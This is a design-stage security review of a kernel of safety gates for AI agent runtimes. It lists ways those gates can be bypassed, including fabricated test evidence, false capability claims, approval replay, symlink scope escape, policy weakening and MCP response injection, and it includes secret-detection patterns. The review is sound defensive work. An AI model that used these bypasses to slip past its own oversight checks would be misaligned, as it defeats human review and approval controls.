# Gate Kernel Architecture — Proactive Security Review

**Document:** Proactive Security Review of ADR-003 Runtime-Neutral Hard Gate Kernel
**Date:** 2026-07-15
**Review Type:** Design-only (no implementation exists)
**Reviewer:** Security Agent
**Classification:** `AMBER_REVIEW` — 27 vulnerabilities identified; 0 confirmed exploitable (no code to test)
**Risk Tier:** `HIGH_HUMAN_GATE` (architecture-level security impact)

---

## 1. Executive Summary

The Runtime-Neutral Hard Gate Kernel (ADR-003) is **architecturally sound in intent** but contains **27 identified design vulnerabilities** that require structural mitigation before implementation. The design correctly identifies the core threat — that safety invariants must not depend on runtime cooperation — and the three-layer gate architecture is a valid approach to solving it. However, several critical assumptions in the design are unenforceable without additional architectural safeguards:

1. **Capability self-declaration is trusted.** Adapters declare their own capabilities via `capabilities()`. A malicious or buggy adapter can claim safety capabilities it does not actually provide, and the kernel has no proactive mechanism to validate these claims before delegating safety-critical decisions.

2. **The "only tightening" rule is semantically fuzzy.** Policy files can set numeric thresholds (TTLs, evidence counts, scope globs) that semantically disable kernel protections without technically "removing" the gate. Kernel-defined floors (maximum TTL, minimum evidence, prohibited glob patterns) are not specified.

3. **JavaScript `Object.freeze()` is shallow.** The design states adapters receive a "frozen copy" of the kernel decision, but `Object.freeze()` does not deeply freeze nested objects. A malicious adapter can mutate `blocked_by` entries, evidence arrays, or capability objects even when the top-level object is frozen.

4. **The approval nonce ledger is not specified.** Cryptographic nonces prevent replay, but if the consumed-nonce ledger is stored in a mutable file without integrity protection, an attacker can delete consumed nonces to re-enable replay.

5. **The handoff manifest has no integrity protection.** The Odysseus handoff JSON is placed in the project root without a cryptographic signature or hash. A filesystem-level attacker can inject malicious gate decisions before Odysseus reads the manifest.

**Overall Assessment:** The design is a significant improvement over the status quo (policy-files-only) and addresses real threats. However, the 27 vulnerabilities identified below must be structurally mitigated in the implementation — they cannot be waved away with documentation or convention. Fifteen of the 27 vulnerabilities are classified as HIGH or CRITICAL severity.

---

## 2. Threat Model

### 2.1 Attacker Model

| Actor | Capabilities | Motivation |
|-------|-------------|------------|
| **Malicious runtime adapter** | Full code execution in the adapter's process space; can call any kernel function with any arguments; can modify its own output before returning to the kernel | Bypass safety gates to perform destructive or unauthorized operations |
| **Compromised policy file** | Can write arbitrary JSON to `.opencode/policies/*.json` (filesystem access at or above project root) | Weaken gate enforcement by setting permissive configuration values |
| **Filesystem-level attacker** | Can read/write project files, including handoff manifests, evidence files, and the consumed-nonce ledger | Forge evidence, replay approvals, modify handoff manifests, poison agent memory |
| **Fake runtime operator** | Can create signal files (fake `opencode.json`, fake `.hermes.md`) to masquerade as a different runtime | Cause wrong adapter selection, leading to incorrect capability assumptions |
| **MCP response injector** | Can control responses from a compromised or malicious MCP server | Inject shell commands, forge evidence, poison agent context |
| **Insider (contributor)** | Can modify kernel source code (PR to kernel.mjs) | Introduce subtle bugs, weaken gate logic, add bypass conditions |
| **AGPL boundary tester** | Attempts to incorporate Odysseus source code into ecosystem | Create legal liability through accidental license contamination |

### 2.2 Trust Boundaries

```
┌────────────────────────────────────────────────────────────────────┐
│ UNTRUSTED ZONE                                                      │
│                                                                     │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────────────┐   │
│  │ Policy   │  │ Runtime  │  │ Handoff  │  │ External MCP     │   │
│  │ Files    │  │ Adapters │  │ Manifests│  │ Servers          │   │
│  └────┬─────┘  └────┬─────┘  └────┬─────┘  └────────┬─────────┘   │
│       │              │              │                 │             │
│       │  ┌───────────┼──────────────┼─────────────────┼──────┐    │
│       │  │           ▼              ▼                 ▼      │    │
│       │  │  ╔════════════════════════════════════════════╗  │    │
│       │  │  ║        TRUST BOUNDARY (KERNEL)            ║  │    │
│       │  │  ║  ┌────────────────────────────────────┐   ║  │    │
│       │  │  ║  │  kernel.mjs (19 hard-coded gates)  │   ║  │    │
│       │  │  ║  │  approval.mjs (nonce ledger)       │   ║  │    │
│       │  │  ║  │  decision.mjs (contract builder)   │   ║  │    │
│       │  │  ║  └────────────────────────────────────┘   ║  │    │
│       │  │  ╚════════════════════════════════════════════╝  │    │
│       │  │                                                   │    │
│       │  │  TRUSTED ZONE (but read-only from kernel)         │    │
│       │  │  ┌────────────────────────────────────────────┐   │    │
│       │  │  │  Evidence files, Test outputs, Logs        │   │    │
│       │  │  │  (validated by NO_FALSE_GREEN)             │   │    │
│       │  │  └────────────────────────────────────────────┘   │    │
│       │  └───────────────────────────────────────────────────┘    │
└────────────────────────────────────────────────────────────────────┘
```

### 2.3 Assets to Protect

| Asset | Value | Attack Surface |
|-------|-------|---------------|
| Kernel gate invariant integrity | **Critical** — safety floor for all runtimes | Adapter override, policy manipulation, import poisoning |
| Approval nonce ledger | **Critical** — prevents replay attacks | Ledger storage tampering, nonce collision |
| Gate decision contract | **High** — single source of truth for all downstream consumers | In-memory mutation after freeze, fabricated evidence |
| Approval receipts | **High** — scope-bound, single-use authorization | Replay, cross-action, expiry bypass |
| Handoff manifest (Odysseus) | **High** — cross-runtime trust boundary | Tampering without integrity check |
| Evidence artifacts | **Medium** — logs, test outputs | Fabrication, secret leakage |
| Agent memory files | **Medium** — persistent context | Poisoning across sessions |
| Policy files | **Medium** — configurable constraints | Semantic weakening |

---

## 3. Vulnerability Analysis

### 3.1 Gate Bypass Vectors

---

#### V-VECTOR-001: Adapter Capability Self-Declaration Without Validation

| Property | Value |
|----------|-------|
| **Severity** | `HIGH` |
| **CVSS-like** | AV:L/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (9.3) |
| **Layer** | Kernel ↔ Adapter boundary |
| **Gates affected** | NO_FAKE_EXECUTION, NO_PATH_ESCAPE, NO_SECRET_LEAK, NO_FALSE_GREEN — any gate that delegates verification to adapter capabilities |

**Description:**
Each adapter declares its capabilities via the `capabilities()` method, which returns a boolean object like `{can_validate_paths: true, can_detect_secrets: true, ...}`. These self-declarations are trusted by the kernel. The design states "Adapters MUST NOT claim capabilities they cannot execute" and references NO_FAKE_EXECUTION as enforcement. However, NO_FAKE_EXECUTION only validates **execution claims** (presence of exit code, stdout, stderr, timestamp) — it does NOT validate **capability declarations** made before any tool execution.

**Attack Vector:**
1. A malicious adapter declares `can_validate_paths: true` in its `capabilities()` method
2. The kernel sees this capability and decides to delegate path validation to the adapter (or records it in the decision contract, allowing downstream consumers to assume path safety)
3. The adapter's actual `normalizeEvidence()` or `evaluateRuntimeGates()` performs no path validation
4. A path escape attack (symlink, traversal) succeeds because the kernel assumed the adapter would handle it

**Impact:**
- False safety assumptions propagate through the decision contract
- Downstream consumers (CI systems, audit tools, other agents) trust the capability claim
- Path escape, secret leakage, or other safety violations occur without detection

**Recommended Mitigation (Structural):**
1. **Never delegate critical safety checks to adapters.** The kernel must ALWAYS perform its own path validation, secret detection, and license checks regardless of what capabilities the adapter claims. Adapter capability claims should ONLY be used to determine:
   - Whether to emit a warning ("runtime X cannot validate paths — kernel fallback used")
   - Whether to add runtime-specific evidence requirements
   - Whether to flag tool gaps
2. **Proactive capability validation.** The `validate()` method must be called BEFORE `capabilities()`, and its output must demonstrate each claimed capability. For example, if `can_validate_paths: true`, the validate method must produce output showing a path validation test was actually executed.
3. **Capability whitelist per runtime identity.** Known-good capability sets per runtime identity (detected via multi-signal `detection.mjs`) should constrain what an adapter is ALLOWED to claim. An unknown adapter (Generic) should default to `false` for all safety-critical capabilities.
4. **Add a dedicated kernel gate:** `NO_CAPABILITY_MISREPRESENTATION` — validates that capability claims are consistent with the detected runtime identity and that `validate()` output supports each claim.

---

#### V-VECTOR-002: Policy File Semantic Weakening of Kernel Invariants

| Property | Value |
|----------|-------|
| **Severity** | `CRITICAL` |
| **CVSS-like** | AV:L/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (9.3) |
| **Layer** | Policy (Layer 2) |
| **Gates affected** | ALL — any kernel gate can be semantically subverted through policy configuration |

**Description:**
Policy files (`.opencode/policies/*.json`) can be configured to "add restrictions only." However, "restriction" is semantically ambiguous. A policy can set configuration values that appear to add configuration but semantically disable kernel protections:

| Policy Setting | Appears To | Actually Does |
|---------------|------------|---------------|
| `approval_ttl_hours: 87600` (10 years) | Configure TTL | Defeats NO_EXPIRED_APPROVAL |
| `scope_paths: ["/**"]` | Configure scope | Defeats NO_CROSS_SCOPE_APPROVAL and NO_UNRELATED_WORKTREE_WRITE |
| `required_evidence: []` (empty) | Customize evidence | Defeats NO_FALSE_GREEN |
| `allowed_push_targets: ["*"]` | Configure allowed targets | Defeats NO_FORCE_PUSH |
| `path_validation: {excluded_dirs: ["/**"]}` | Add exclusions | Defeats NO_PATH_ESCAPE |
| `secret_patterns: []` (empty) | Customize patterns | Defeats NO_SECRET_LEAK |
| `non_touch_areas: []` (empty) | Customize non-touch | Defeats NO_UNRELATED_WORKTREE_WRITE |

**Attack Vector:**
1. Attacker gains filesystem write access to `.opencode/policies/` directory (same privilege level as project files)
2. Attacker modifies a policy file to set extreme permissive values
3. The `policy.mjs` loader reads these values and applies them
4. Kernel gates that reference policy-defined thresholds are semantically disabled

**Impact:**
- Kernel invariants are bypassed through configuration
- The "never configurable" claim for kernel gates is false if policy files can set empty constraints
- All 19 gates could be weakened through targeted policy configuration

**Recommended Mitigation (Structural):**
1. **Kernel-defined floors for ALL numeric and array-valued policy settings.** The kernel must maintain a hard-coded map of minimum/maximum values that policy files cannot exceed:

```javascript
// In kernel.mjs — immutable, never overridable
const KERNEL_FLOORS = Object.freeze({
  "approval_ttl_hours":     { max: 24,   reason: "NO_EXPIRED_APPROVAL" },
  "approval_ttl_context":   { max: 4,    reason: "NO_EXPIRED_APPROVAL (HOT)" },
  "scope_paths_glob":       { prohibited: ["/**", "*"], reason: "NO_CROSS_SCOPE_APPROVAL" },
  "required_evidence_min":  { min: 1,    reason: "NO_FALSE_GREEN" },
  "non_touch_areas":        { require: ["SECURITY.md", "LICENSE"], reason: "NO_UNRELATED_WORKTREE_WRITE" },
  "secret_patterns":        { require: ["sk-*", "ghp_*", "-----BEGIN.*PRIVATE KEY-----"], reason: "NO_SECRET_LEAK" },
  "approval_nonce_bytes":   { min: 32,   reason: "NO_APPROVAL_REUSE" },
  "backup_required":        { value: true, reason: "NO_APPLY_WITHOUT_BACKUP" },
  "manifest_hash_algo":     { value: "SHA-256", reason: "NO_ROLLBACK_WITHOUT_VALIDATED_MANIFEST" }
});
```

2. **Policy loader rejection:** `policy.mjs` must reject any policy file that sets a value outside kernel-defined bounds with a specific gate: `POLICY_WEAKENS_KERNEL_GATE → RED_BLOCK`
3. **Structural prohibition:** The kernel must maintain a list of configuration keys that policy files are NEVER permitted to override (blocklist), not just a list of what they can add (allowlist).
4. **Cryptographic reference:** The `gate-kernel-invariants.json` file (read-only reference) should carry a SHA-256 hash of the kernel floor values. Any mismatch between the reference file and `kernel.mjs` should trigger `RED_BLOCK: KERNEL_FLOOR_TAMPERING`.

---

#### V-VECTOR-003: Kernel Import Graph Poisoning

| Property | Value |
|----------|-------|
| **Severity** | `MEDIUM` |
| **CVSS-like** | AV:L/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:L (7.2) |
| **Layer** | Kernel (Layer 1) |
| **Gates affected** | ALL — any gate could be weakened if kernel.mjs imports from untrusted modules |

**Description:**
The design specifies: "kernel.mjs must have zero imports from runtime adapters, policies, or configuration files that could be modified at runtime. It defines its 19 gates as pure functions. The only external dependency permitted is node:crypto."

**Attack Vector:**
1. A contributor (insider or compromised PR) adds an import to `kernel.mjs` for a convenience function from a policy module
2. The import is subtle (`import { formatReason } from '../policy.mjs'`)
3. Code review misses it (large PR, complex diff)
4. The imported module is now in the kernel's trust boundary
5. If that module reads from configurable files, the kernel's immutability is broken

**Impact:**
- The kernel's "zero imports from untrusted modules" invariant is maintained only by convention
- A single missed import in code review compromises the entire kernel isolation

**Recommended Mitigation (Structural):**
1. **Build-time import graph validation.** Add a CI check that parses `kernel.mjs` AST and verifies that every import is from `node:` builtins only. Any import from a relative path, npm package, or non-`node:` builtin → build fails.
2. **ESLint rule:** `no-restricted-imports` configured at the `kernel.mjs` file level to block all non-`node:` imports.
3. **Runtime guard:** At the top of `kernel.mjs`, before any gate logic runs, assert that `require.cache` contains only `node:` builtins for kernel modules:

```javascript
// kernel.mjs — first executable line
function assertKernelPurity() {
  for (const mod of Object.keys(require.cache)) {
    if (!mod.startsWith('node:') && mod.includes('/gates/kernel')) {
      throw new Error(`KERNEL_PURITY_VIOLATION: Unexpected import ${mod}`);
    }
  }
}
```

4. **Tamper-evident module boundary:** The kernel module should export a `KERNEL_INTEGRITY_HASH` that is the SHA-256 of its own source code. Downstream consumers can verify this hash against a known-good value from the repository.

---

#### V-VECTOR-004: Verification Level Misclassification

| Property | Value |
|----------|-------|
| **Severity** | `HIGH` |
| **CVSS-like** | AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H (7.1) |
| **Layer** | Decision Contract |
| **Gates affected** | NO_FALSE_GREEN, NO_FAKE_EXECUTION |

**Description:**
The decision contract's `verification_level` field has six values ranging from `NOT_CHECKED` to `LIVE_INTEGRATION_PASS`. An adapter (or policy) can claim `STRUCTURAL_PASS` for a gate that intrinsically requires `LIVE_INTEGRATION_PASS`. The design does not specify which verification level each gate requires as its minimum.

**Attack Vector:**
1. The Odysseus Docker socket check requires live verification (actually checking what address Docker is bound to)
2. The adapter runs during a context where Docker is not available
3. The adapter returns `verification_level: "STRUCTURAL_PASS"` because it found the Docker config file but could not check the actual binding
4. The kernel accepts this level, the operation proceeds
5. Docker is actually bound to `0.0.0.0` without auth → CRITICAL exposure

**Impact:**
- Safety-critical checks validated only on paper, not in reality
- False sense of security from "PASS" classification
- NO_FALSE_GREEN and NO_FAKE_EXECUTION gates are themselves bypassed through verification level misclassification

**Recommended Mitigation (Structural):**
1. **Each kernel gate must declare its minimum required verification level in its gate definition:**

```javascript
const GATE_MINIMUM_VERIFICATION = Object.freeze({
  NO_PATH_ESCAPE:               "LIVE_INTEGRATION_PASS",  // Must actually resolve paths
  NO_SYMLINK_ESCAPE:            "LIVE_INTEGRATION_PASS",  // Must actually lstat
  NO_SECRET_LEAK:               "CLI_PASS",               // Must actually scan content
  NO_FAKE_EXECUTION:            "LIVE_INTEGRATION_PASS",  // Must have actual exit codes
  NO_FALSE_GREEN:               "LIVE_INTEGRATION_PASS",  // Must have actual evidence
  NO_APPLY_WITHOUT_BACKUP:      "LIVE_INTEGRATION_PASS",  // Must have actual backup
  NO_FORCE_PUSH:                "STRUCTURAL_PASS",        // Pattern match on command string is sufficient
  NO_REVIEWER_WRITE:            "STRUCTURAL_PASS",        // Role check is sufficient
  NO_AGPL_INCORPORATION:        "CLI_PASS",               // Must scan dependency manifests
  // ... for each gate
});
```

2. **Kernel rejection of insufficient verification:** The `decision.mjs` builder must reject any decision where the achieved verification level is below the gate's required minimum → `RED_BLOCK: INSUFFICIENT_VERIFICATION_LEVEL`.

3. **Verification level ordering is strict total order:**
```
NOT_CHECKED < STRUCTURAL_PASS < CLI_PASS < RUNTIME_SMOKE_PASS < LIVE_INTEGRATION_PASS
```
Any claim must be at or above the required minimum.

---

### 3.2 Approval Replay / Reuse

---

#### V-APPROVAL-001: Nonce Ledger Storage Without Integrity Protection

| Property | Value |
|----------|-------|
| **Severity** | `CRITICAL` |
| **CVSS-like** | AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H (7.1) |
| **Layer** | Approval (approval.mjs) |
| **Gates affected** | NO_APPROVAL_REUSE |

**Description:**
The approval receipt model uses a 32-byte cryptographic nonce. When an action is executed, "the nonce is recorded in the consumed-nonce ledger." The design does not specify:
- Where the ledger is stored (in-memory? file? database?)
- What protects the ledger from tampering
- What happens when the ledger is lost (restart, crash)

**Attack Vector:**
1. Approval for `push` is issued, nonce `N1`
2. Push is executed, nonce `N1` is consumed → recorded in ledger
3. Attacker deletes the ledger file (or modifies it, or the process restarts with in-memory ledger)
4. Attacker submits the same approval receipt with nonce `N1` again
5. The kernel checks the ledger, `N1` is not found → approval appears valid
6. Push is re-executed without re-approval

**Impact:**
- Single-use approval becomes multi-use if the ledger can be cleared
- Force-push (blocked by other gates) could be replayed if approval was granted

**Recommended Mitigation (Structural):**
1. **Append-only ledger with cryptographic chaining.** Each ledger entry contains a hash of the previous entry, creating a tamper-evident chain. Modifying or deleting an entry is detectable:

```javascript
const ledgerEntry = {
  nonce: "base64url-32-bytes",
  consumed_at: "2026-07-15T14:30:00.000Z",
  action: "push",
  prev_hash: "sha256-of-previous-entry"
};
```

2. **In-memory ledger backed by persistent, signed file.** The ledger operates in memory for performance but is periodically flushed to a signed file. On restart, the file's signature is verified before loading.
3. **Separate ledger-per-repository.** To prevent cross-repository nonce confusion, each repository has its own ledger in a well-defined location within the project boundary (e.g., `.opencode/ledger/nonces.jsonl`).
4. **Kernel gate: NO_LEDGER_TAMPERING.** Verifies ledger integrity before any approval is consumed. Missing or corrupted ledger → `RED_BLOCK`.
5. **Make the nonce ledger part of `NO_UNRELATED_WORKTREE_WRITE` scope.** The ledger file must be write-protected against unauthorized modification.

---

#### V-APPROVAL-002: Context Fingerprint Forgery

| Property | Value |
|----------|-------|
| **Severity** | `HIGH` |
| **CVSS-like** | AV:L/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N (5.5) |
| **Layer** | Approval (approval.mjs) |
| **Gates affected** | NO_CROSS_ACTION_APPROVAL, NO_CROSS_SCOPE_APPROVAL |

**Description:**
The context fingerprint is `SHA-256(current-state)` where "current-state" is described as "git tree hash, affected file list, risk tier, verification contract hash." If an attacker can control the inputs to this hash, they can forge a valid fingerprint.

**Attack Vector:**
1. Legitimate approval is issued for `feature/A` with fingerprint `SHA-256(tree-A + files-A + tier + contract-A)`
2. Attacker wants to use this approval for `feature/B`
3. Attacker modifies `feature/B`'s git tree to match the hash input components (e.g., creates a commit with the same tree hash via `git commit-tree`, or modifies the verification contract file on `feature/B` to match the hash)
4. The fingerprint computed for `feature/B` now matches the approved fingerprint
5. Cross-branch approval bypass

**Impact:**
- Scope-bound approval can be transplanted to a different branch
- Fingerprint-based validity check is bypassed

**Recommended Mitigation (Structural):**
1. **Include a branch-specific nonce in the fingerprint.** The fingerprint must include a value that is unique to the branch and cannot be replicated on another branch without detection:
   - Full commit SHA (not just tree SHA — commits are unique even with identical trees)
   - Branch name (as a string, not just its content hash)
   - Repository canonical URL
2. **The fingerprint must be a MAC, not just a hash.** Use HMAC-SHA256 with a kernel-derived key that only the kernel knows (derived from the project root path + a kernel secret). This makes it impossible for an external attacker to forge a valid fingerprint without knowing the kernel's key.
3. **Fingerprint comparison must be structural, not just hash equality.** Compare the individual components (branch, repo, commit, files) structurally before comparing hashes. The hash is a secondary check, not the primary one.

---

#### V-APPROVAL-003: Scope Path Glob Matching Bypass via Path Normalization

| Property | Value |
|----------|-------|
| **Severity** | `HIGH` |
| **CVSS-like** | AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N (7.1) |
| **Layer** | Approval (approval.mjs) |
| **Gates affected** | NO_CROSS_SCOPE_APPROVAL |

**Description:**
Scope paths use glob matching: "File paths are matched against the approval's scope paths using glob matching." Glob matching has well-known edge cases:

1. `src/**` does not match `src/../../etc/passwd` if resolved, but does match `src/../../etc/passwd` as a literal glob
2. Symlinks can make a path inside scope resolve to a target outside scope
3. Path normalization differences between glob library and filesystem (trailing slashes, `.` and `..` segments, Unicode normalization)

**Attack Vector:**
1. Approval scope is `src/api/**`
2. Attacker creates a symlink `src/api/handler.ts` → `../../.opencode/policies/evidence-gates.json`
3. The path `src/api/handler.ts` matches the glob `src/api/**`
4. But the write targets `.opencode/policies/evidence-gates.json` — outside scope
5. `NO_CROSS_SCOPE_APPROVAL` passes (glob matched), but `NO_UNRELATED_WORKTREE_WRITE` might also pass if scope is checked by glob before symlink resolution

**Impact:**
- File writes outside approved scope succeed
- Symlink traversal bypasses scope restrictions

**Recommended Mitigation (Structural):**
1. **Resolve paths before glob matching.** ALL paths must be fully resolved (realpath, all symlinks expanded) BEFORE glob matching. This means `NO_SYMLINK_ESCAPE` and `NO_PATH_ESCAPE` must be checked first, and only then does the scope check run on the resolved path.
2. **Gate ordering is mandatory.** The scope gate must explicitly depend on path-safety gates passing. If `NO_PATH_ESCAPE` or `NO_SYMLINK_ESCAPE` produces `RED_BLOCK`, scope validation is not even attempted (the operation is already blocked).
3. **Use a glob library that operates on resolved canonical paths only**, never on raw user-provided paths.

---

#### V-APPROVAL-004: System Clock Manipulation for Expiry Bypass

| Property | Value |
|----------|-------|
| **Severity** | `MEDIUM` |
| **CVSS-like** | AV:L/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N (5.5) |
| **Layer** | Approval (approval.mjs) |
| **Gates affected** | NO_EXPIRED_APPROVAL |

**Description:**
NO_EXPIRED_APPROVAL compares `Date.now() > approval.expires_at`. `Date.now()` is the system clock. If the system clock is manipulated (VM clock reset, NTP spoofing, container clock isolation), an expired approval can appear valid.

**Attack Vector:**
1. Approval expires at `2026-07-15T18:00:00Z`
2. Attacker sets system clock to `2026-07-15T17:00:00Z`
3. `Date.now()` returns a timestamp before expiry
4. Approval is accepted by the kernel

**Impact:**
- Expired approvals can be revived
- Time-based safety mechanisms undermined

**Recommended Mitigation (Structural):**
1. **Monotonic clock for relative time.** Use `process.hrtime.bigint()` for measuring elapsed time from approval issuance, rather than absolute system clock for expiry checking.
2. **Absolute time with sanity checks.** If absolute time is needed, compare against multiple sources:
   - System clock
   - Most recent git commit timestamp (immutable once committed)
   - File modification timestamp of a known reference file
   - If clocks diverge by more than a threshold (e.g., 1 hour), produce warning and downgrade to `AMBER_REVIEW`
3. **Approval TTL + issuance timestamp.** The approval stores `issued_at` and `ttl_seconds`. Expiry is computed as `issued_at + ttl_seconds`. Even if the clock changes, the TTL can be validated against the most recent known-good timestamp (from git log).

---

#### V-APPROVAL-005: Repository URL Changes Affecting Scope Binding

| Property | Value |
|----------|-------|
| **Severity** | `LOW` |
| **CVSS-like** | AV:L/AC:H/PR:H/UI:N/S:U/C:N/I:L/A:N (2.5) |
| **Layer** | Approval (approval.mjs) |
| **Gates affected** | NO_REMOTE_ACTION_WITHOUT_SCOPED_APPROVAL |

**Description:**
Approvals are bound to `repository` by URL (`git@github.com:org/repo.git`). If the repository URL changes (rename, transfer, mirror), the approval becomes invalid for the new URL — which is correct behavior. But in the reverse direction: if the old URL still resolves (GitHub redirects), an approval for the old URL might authorize actions on the renamed repository.

**Impact:**
- Low severity because repository URL changes are rare and the window is narrow
- Could allow cross-repository approval if URL redirects are not followed

**Recommended Mitigation (Structural):**
1. **Bind to repository GUID if available** (GitHub repository ID, not URL). Fall back to URL only if no stable identifier exists.
2. **Validate remote URL at approval consumption time**, not just at issuance time. If the remote's `origin` URL has changed, the approval is invalidated.

---

### 3.3 False Green / Fake Execution

---

#### V-FALSE-001: Tool Gap in Safety-Critical Tools Treated as Non-Blocking

| Property | Value |
|----------|-------|
| **Severity** | `HIGH` |
| **CVSS-like** | AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H (7.1) |
| **Layer** | Decision Contract |
| **Gates affected** | NO_FALSE_GREEN, NO_FAKE_EXECUTION |

**Description:**
The decision contract has `TOOL_GAP` as one of four classifications (`GREEN_SAFE | AMBER_REVIEW | RED_BLOCK | TOOL_GAP`). The design implies `TOOL_GAP` is informational — "Here's what's missing." But what happens when the missing tool is safety-critical?

**Attack Vector:**
1. Docker is required for sandboxed execution (container isolation)
2. Docker is not available → tool gap recorded
3. The operation proceeds with direct host execution (or no execution at all) because `TOOL_GAP` is not `RED_BLOCK`
4. Sandbox escape is trivially possible

**Impact:**
- Safety-critical tool absence does not block operations
- Adapters can work around missing safety tools by recording a gap and proceeding

**Recommended Mitigation (Structural):**
1. **Tool-gap criticality tiers.** Each tool has a criticality classification:

```javascript
const TOOL_CRITICALITY = Object.freeze({
  docker:    "BLOCKING",  // No container → no sandboxed execution
  git:       "BLOCKING",  // No git → no change tracking
  node:      "WARNING",   // No node → can't run kernel but we're already in node
  playwright:"WARNING",   // No playwright → can't do visual QA but can do other work
});
```

2. **BLOCKING tool gap → RED_BLOCK.** The classification must be elevated from `TOOL_GAP` to `RED_BLOCK` when a BLOCKING tool is missing and the requested operation requires it.
3. **Fallback validation.** If a tool is missing but a fallback exists, the fallback must also pass kernel gates. For example, "Direct host execution (denied by kernel gate NO_PRODUCTION_WRITE_WITHOUT_APPROVAL)" should automatically escalate to `RED_BLOCK`.

---

#### V-FALSE-002: Evidence Fabrication via normalizeEvidence()

| Property | Value |
|----------|-------|
| **Severity** | `HIGH` |
| **CVSS-like** | AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N (5.5) |
| **Layer** | Adapter Contract |
| **Gates affected** | NO_FALSE_GREEN, NO_FAKE_EXECUTION |

**Description:**
The adapter contract includes `normalizeEvidence(rawEvidence)` which converts runtime-native evidence into a standard format. A malicious adapter can fabricate evidence in the normalization step — it receives `rawEvidence` (which could be empty, fabricated, or invalid) and "normalizes" it into valid-looking normalized evidence.

**Attack Vector:**
1. No test was actually run
2. Adapter calls `normalizeEvidence({ stdout: "", stderr: "", exitCode: null })`
3. The normalize function fabricates plausible output: `{ stdout: "All tests passed", stderr: "", exitCode: 0, timestamp: Date.now() }`
4. The kernel sees "valid" evidence with all required fields

**Impact:**
- Evidence gates are bypassed through evidence fabrication
- NO_FAKE_EXECUTION is defeated if the adapter is the evidence source

**Recommended Mitigation (Structural):**
1. **Evidence sources must be independently verifiable.** The kernel should not accept evidence that comes exclusively through an adapter's normalize method. For any evidence type, the kernel must be able to independently verify at least one artifact:
   - For tests: the kernel can run `node --test` and capture output directly
   - For file operations: the kernel checks `fs.stat()` timestamps
   - For git operations: the kernel checks `git log` directly
2. **normalizeEvidence() must be a pure transformation, not a fabricator.** Evidence fields that are missing from `rawEvidence` must remain missing in `normalizedEvidence`. The normalization must not add, invent, or infer any evidence field not present in the raw input. This constraint must be enforced by the kernel: diff `rawEvidence` keys against `normalizedEvidence` keys — new keys are rejected.
3. **Adapters must implement a NO_EVIDENCE_FABRICATION self-check.** The adapter's `evaluateRuntimeGates()` must verify that its `normalizeEvidence()` does not fabricate fields.

---

#### V-FALSE-003: Classification Downgrade Acceptance Without Evidence

| Property | Value |
|----------|-------|
| **Severity** | `MEDIUM` |
| **CVSS-like** | AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L (5.1) |
| **Layer** | Decision Contract |
| **Gates affected** | NO_FALSE_GREEN |

**Description:**
NO_FALSE_GREEN says: "Auto-downgrade: GREEN_SAFE → AMBER_REVIEW if evidence incomplete." But what prevents an adapter from claiming `AMBER_REVIEW` (and then proceeding, since AMBER_REVIEW allows operations after human review) when the correct classification is `RED_BLOCK`?

The downgrade is ONE step. If evidence is missing AND a kernel gate would block the operation, the classification should be `RED_BLOCK`, not `AMBER_REVIEW`.

**Attack Vector:**
1. Operation requires evidence of test pass
2. Evidence is missing → auto-downgrade to `AMBER_REVIEW`
3. Adapter claims "AMBER_REVIEW with 1 warning" (missing evidence is the warning)
4. Human reviewer sees `AMBER_REVIEW`, approves because they assume the warning is minor
5. Operation proceeds without actual test evidence

**Impact:**
- `AMBER_REVIEW` becomes a catch-all for "should be RED_BLOCK but we want to proceed"
- Human gate is trained to accept AMBER_REVIEW as routine

**Recommended Mitigation (Structural):**
1. **Missing evidence for BLOCKING gates → RED_BLOCK, never downgraded to AMBER_REVIEW.** The classification logic must distinguish between:
   - `AMBER_REVIEW`: All kernel gates passed, some policy-level requirements are unmet
   - `RED_BLOCK`: At least one kernel gate failed or required evidence is completely absent
2. **Evidence-gate criticality.** Each gate in evidence-gates.json must declare whether missing evidence for that gate is `RED_BLOCK` or `AMBER_REVIEW`. Safety-critical evidence (test output for MEDIUM_REVIEW tasks, security review for HIGH_HUMAN_GATE tasks) must be `RED_BLOCK` on absence.

---

### 3.4 Runtime-Specific Escalations

---

#### V-ODY-001: Docker Socket Binding — Structural vs Live Check Gap

| Property | Value |
|----------|-------|
| **Severity** | `CRITICAL` |
| **CVSS-like** | AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (10.0) |
| **Runtime** | Odysseus |
| **Gates affected** | NO_PATH_ESCAPE, implied Docker binding gate |

**Description:**
The ADR states: "Docker socket mounted without auth — CRITICAL — Kernel gate detects 0.0.0.0 bind without auth and produces RED_BLOCK." However, the mechanism for "detecting" this binding is not specified. If detection is structural (checking the Docker daemon config file for `"hosts": ["tcp://0.0.0.0:2375"]`), it misses:
- Runtime binding changes (config changed after daemon start)
- Environment variable overrides (`DOCKER_HOST`)
- Systemd override files
- Cloud-init or user-data scripts that modify binding at boot

**Attack Vector:**
1. Docker config file shows `hosts: ["unix:///var/run/docker.sock"]` (safe)
2. Systemd override sets `DOCKER_HOST=tcp://0.0.0.0:2375` at runtime
3. Kernel checks the config file → `STRUCTURAL_PASS`
4. Docker is actually listening on `0.0.0.0:2375` without auth
5. Attacker connects to Docker socket from network → container escape → host access

This is the **highest-severity vulnerability** in the entire design because:
- `0.0.0.0` Docker socket without auth = immediate remote code execution on host
- CVSS 10.0 — network vector, no privileges, no user interaction, scope change
- The mitigation in the ADR relies on detection that may be purely structural

**Recommended Mitigation (Structural):**
1. **Docker binding check MUST be live, never structural.** The Odysseus adapter must execute `docker info --format '{{.Host}}'` or check `netstat -tlnp | grep 2375` (or equivalent) at runtime. Structural config-file checks are insufficient and should ONLY produce a warning that says "live check not performed — assuming unsafe."
2. **Missing Docker CLI → automatic RED_BLOCK for network binding check.** If the `docker` CLI is not available, the binding check cannot be verified → `RED_BLOCK: CANNOT_VERIFY_DOCKER_BINDING`.
